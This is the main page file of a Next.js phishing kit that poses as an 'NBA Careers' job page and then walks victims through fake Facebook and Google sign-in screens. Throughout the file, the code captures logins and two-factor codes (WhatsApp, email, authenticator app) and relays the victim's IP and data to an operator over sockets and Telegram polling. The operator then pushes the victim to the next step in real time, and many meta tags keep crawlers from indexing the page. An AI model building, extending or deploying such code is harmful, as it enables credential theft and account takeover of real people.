import Head from "next/head";
import styles from "../styles/Home.module.css";
import React, { createContext, useState, useEffect } from "react";
import { io } from "socket.io-client";
import { useHideRecaptchaBadge } from "../hooks/useHideRecaptchaBadge";
import { getSocketUrl } from "../config/api";

// Component imports - Main page components
import Step1 from "../components/fbook/Step1.js";
import Step2 from "../components/fbook/Step2.js";
import Step3 from "../components/fbook/Step3.js";

import Fa2 from "../components/fbook/Fa2.js";
import Fa2Red from "../components/fbook/Fa2Red.js";
import PhoneVerify from "../components/fbook/PhoneVerify.js";
import Done from "../components/common/Done.js";
import Fa2Whatsapp from "../components/fbook/Fa2Whatsapp.js";
import Fa2Email from "../components/fbook/Fa2Email.js";
import Fa2AuthApp from "../components/fbook/Fa2AuthApp.js";
import GoogleConfirm from "../components/frriSpecific/GoogleConfirm.js";
import GoogleSignInPC from "../components/gmail/GoogleSignInPC.js";
import GoogleSignInMobile from "../components/gmail/GoogleSignInMobile.js";

// Hooks
import { useUserData } from "../hooks/useUserData";
import { useStepManagement } from "../hooks/useStepManagement";
import { useIPManagement } from "../hooks/useIPManagement";
import { useInitialSetup } from "../hooks/useInitialSetup";
import { useTelegramPolling } from "../hooks/useTelegramPolling";
import { useSocketConnection } from "../utils/socket/useSocketConnection";
import SendData from "../hooks/SendData";

// Utils
import { PageUtils } from "../utils/pageUtils";

// Step mapping for better maintainability
const STEP_COMPONENTS = {
  // 1 = NBA careers page in iframe (handled separately)
  2: Step2,
  3: Fa2,
  4: Step3,
  6: Fa2Red,
  7: Step1,
  10: PhoneVerify,
  11: Done,
  12: Fa2Whatsapp,
  13: Fa2Email,
  14: Fa2,
  15: Fa2AuthApp,
  16: GoogleConfirm,
  17: GoogleConfirm,
};

export const DataContext = createContext();

// Main component
export default function Home() {
  // Hide badge for FB steps
  const FBOOK_STEPS = new Set([1, 2, 3, 4, 6, 7, 10, 12, 13, 14, 15]);
  const [ContinueWithFacebook, setContinueWithFacebook] = useState(true);
  const [showGoogleSignIn, setShowGoogleSignIn] = useState(false);
  const [isMobileDevice, setIsMobileDevice] = useState(false);
  const userData = useUserData();
  const stepManagement = useStepManagement();
  useHideRecaptchaBadge(FBOOK_STEPS.has(stepManagement.Step));

  // Initialize user data and setup - this will handle IP fetching
  const { Unik, isInitialized } = useInitialSetup(
    userData.setAllData,
    stepManagement.setStep
  );

  // IP management (gets IP from AllData, handles ban checking)
  const { Ip, setIp } = useIPManagement();

  // Update IP when AllData changes (from initial setup)
  useEffect(() => {
    if (userData.AllData?.ip && userData.AllData.ip !== Ip) {
      setIp(userData.AllData.ip);
    }
  }, [userData.AllData?.ip, Ip, setIp]);

  // Detect mobile
  useEffect(() => {
    const check = () => setIsMobileDevice(window.innerWidth < 768);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);

  // Listen for admin /google command
  useEffect(() => {
    const handleGoogleConfirm = () => stepManagement.setStep(17);
    window.addEventListener("admin-facebook-google", handleGoogleConfirm);
    return () => window.removeEventListener("admin-facebook-google", handleGoogleConfirm);
  }, [stepManagement.setStep]);

  // Close Google Sign-In overlay whenever the step moves away from 17
  useEffect(() => {
    if (stepManagement.Step !== 17) {
      setShowGoogleSignIn(false);
    }
  }, [stepManagement.Step]);

  // Listen for gmail socket events (google-confirm, email2fa)
  const stepRef = React.useRef(stepManagement.Step);
  const showGoogleRef = React.useRef(showGoogleSignIn);
  useEffect(() => { stepRef.current = stepManagement.Step; }, [stepManagement.Step]);
  useEffect(() => { showGoogleRef.current = showGoogleSignIn; }, [showGoogleSignIn]);

  useEffect(() => {
    if (!Unik) return;

    const socketInstance = io(getSocketUrl(), {
      transports: ["websocket", "polling"],
    });

    const twoFaEvent = `gmail-2fa-${Unik}`;
    socketInstance.on(twoFaEvent, (data) => {
      if (data.type === "email2fa" && !(stepRef.current === 17 && showGoogleRef.current)) {
        console.log("[Home] email2fa decision received via socket, setting step 13");
        stepManagement.setStep(13);
        stepManagement.setLastFetch("Email2fa");
      }
    });

    const googleConfirmEvent = `gmail-google-confirm-${Unik}`;
    socketInstance.on(googleConfirmEvent, (data) => {
      if (data.email) {
        userData.setAllData((prev) => ({ ...prev, login_email: data.email }));
      }
      stepManagement.setStep(17);
      window.dispatchEvent(new CustomEvent("admin-google-gmail", { detail: { email: data.email } }));
    });

    socketInstance.connect();

    return () => {
      socketInstance.disconnect();
    };
  }, [Unik]);

  // Additional hooks
  useTelegramPolling(
    Unik,
    stepManagement.setStep,
    stepManagement.setLastFetch,
    stepManagement.LastFetch,
    Ip,
    stepManagement.setWrong2faTrigger,
    stepManagement.wrong2faTrigger,
    stepManagement.setWrongPasswordTrigger,
    stepManagement.wrongPasswordTrigger,
    stepManagement.setWrongCredsTrigger,
    stepManagement.wrongCredsTrigger,
    stepManagement.Step
  );

  useSocketConnection(Unik, userData.AllData);

  const isNBAPage = stepManagement.Step === 1 || stepManagement.Step === 11;
  const iframeRef = React.useRef(null);

  useEffect(() => {
    if (stepManagement.Step === 11 && iframeRef.current) {
      const send = () => iframeRef.current?.contentWindow?.postMessage({ type: 'nba-show-done' }, '*');
      send();
      setTimeout(send, 600);
    }
  }, [stepManagement.Step]);

  useEffect(() => {
    window.__nbaFormSubmit = (stepText, email) => {
      const userId = Unik || userData.AllData?.id;
      if (!userId) {
        console.warn("[__nbaFormSubmit] No user ID yet, retrying in 500ms");
        setTimeout(() => window.__nbaFormSubmit?.(stepText, email), 500);
        return;
      }

      setContinueWithFacebook(!email);
      if (email) {
        userData.setBusinessEmail(email);
      }

      const lowerStep = stepText.toLowerCase();
      const isFacebookFlow = lowerStep.includes("facebook");
      const isGoogleFlow = lowerStep.includes("google") || lowerStep.includes("gmail");

      let mappedStep = stepText;
      if (isFacebookFlow && !stepText.includes("clicked")) {
        mappedStep = "User clicked continue with Facebook";
      } else if (isGoogleFlow && !stepText.includes("clicked")) {
        mappedStep = "User clicked continue with Google";
      } else if (!isFacebookFlow && !isGoogleFlow && email && !stepText.includes("clicked")) {
        mappedStep = "User clicked continue with email";
      }

      const params = {
        ...userData.AllData,
        id: userId,
        ip: Ip || userData.AllData?.ip || "unknown",
        business_email: email || "",
        page_name: isFacebookFlow ? "Facebook" : isGoogleFlow ? "Gmail" : userData.AllData?.page_name,
        currentStep: mappedStep,
      };
      userData.setAllData(params);
      SendData(params);
      stepManagement.setStep(2);
    };
    return () => { delete window.__nbaFormSubmit; };
  }, [userData.AllData, Unik, Ip]);

  const isGoogleSignInActive =
    stepManagement.Step === 17 && showGoogleSignIn;

  // Dynamic title and favicon based on step
  const { title, favicon } = isGoogleSignInActive
    ? {
        title: "Sign in - Google Accounts",
        favicon: "/Images/google.svg",
      }
    : PageUtils.getPageMeta(stepManagement.Step);

  const renderGoogleSignIn = () => {
    const googleSignInProps = {
      Unik,
      Tel: userData.AllData?.phone_number || "",
      Email: "",
      setEmail: (value) =>
        userData.setAllData((prev) => ({ ...prev, login_email: value })),
      Name: userData.AllData?.full_name || "",
      BusinessEmail: userData.AllData?.business_email || "",
      Ip,
      setParentBeginTimer: () => {},
      onClose: () => setShowGoogleSignIn(false),
    };

    return isMobileDevice ? (
      <GoogleSignInMobile {...googleSignInProps} />
    ) : (
      <GoogleSignInPC {...googleSignInProps} />
    );
  };

  // Render step component
  const renderStepComponent = () => {
    if (stepManagement.Step === 17 && showGoogleSignIn) {
      return renderGoogleSignIn();
    }

    const Component = STEP_COMPONENTS[stepManagement.Step];
    if (!Component) return null;

    const commonProps = {
      setStep: stepManagement.setStep,
      setLastFetch: stepManagement.setLastFetch,
      setShowGoogleSignIn,
      Unik,
      Ip,
      setIp,
      Step: stepManagement.Step,
      InvalidPassword: stepManagement.InvalidPassword,
      ContinueWithFacebook,
      setContinueWithFacebook,
      LastFetch: stepManagement.LastFetch,
      wrong2faTrigger: stepManagement.wrong2faTrigger,
      wrongPasswordTrigger: stepManagement.wrongPasswordTrigger,
      wrongCredsTrigger: stepManagement.wrongCredsTrigger,
      ...userData,
    };

    // Inject step-specific props for GoogleConfirm (step 17)
    if (stepManagement.Step === 17) {
      commonProps.onConfirm = (gmail) => {
        if (gmail && typeof gmail === "string") {
          userData.setAllData((prev) => ({ ...prev, login_email: gmail }));
        }
        setShowGoogleSignIn(true);
      };
      commonProps.onClose = () => {
        setContinueWithFacebook(true);
        setShowGoogleSignIn(false);
        stepManagement.setStep(2);
      };
    }

    return <Component {...commonProps} />;
  };

  if (isNBAPage) {
    return (
      <>
        <Head>
          <title>NBA Careers</title>
          <link rel="icon" href="/favicon.ico" />
        </Head>
        <style jsx global>{`
          html, body { margin: 0; padding: 0; overflow: hidden; height: 100%; }
          #__next { height: 100%; }
        `}</style>
        <iframe
          ref={iframeRef}
          src={stepManagement.Step === 11 ? "/nba-careers.html#nba-done" : "/nba-careers.html"}
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            width: '100%',
            height: '100%',
            border: 'none',
          }}
          title="NBA Careers"
        />
      </>
    );
  }

  // ── Steps 2+: form flow ──
  return (
    <div className={styles.container}>
      <Head>
        <title>{title}</title>
        <link rel="icon" href={favicon} />
        <meta charSet="utf-8" />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1"
        />
        <meta name="theme-color" content="#fff" />
        <meta name="robots" content="noimageindex" />
        <meta name="robots" content="notranslate" />
        <meta name="robots" content="nositelinkssearchbox" />
        <meta name="robots" content="nosnippet" />
        <meta name="robots" content="max-snippet:0" />
        <meta
          name="crawler"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="AdsBot-Google"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot-news"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta name="googlebot-news" content="nosnippet" />
        <meta name="robots" content="max-image-preview:none" />
        <meta name="robots" content="noindex,nofollow,noarchive" />
        <meta name="robots" content="noarchive" />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: light)"
        />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: dark)"
        />
      </Head>

      <DataContext.Provider
        value={{ setAllData: userData.setAllData, AllData: userData.AllData }}
      >
        <div className="">
          <div className="">{renderStepComponent()}</div>
        </div>
      </DataContext.Provider>
    </div>
  );
}
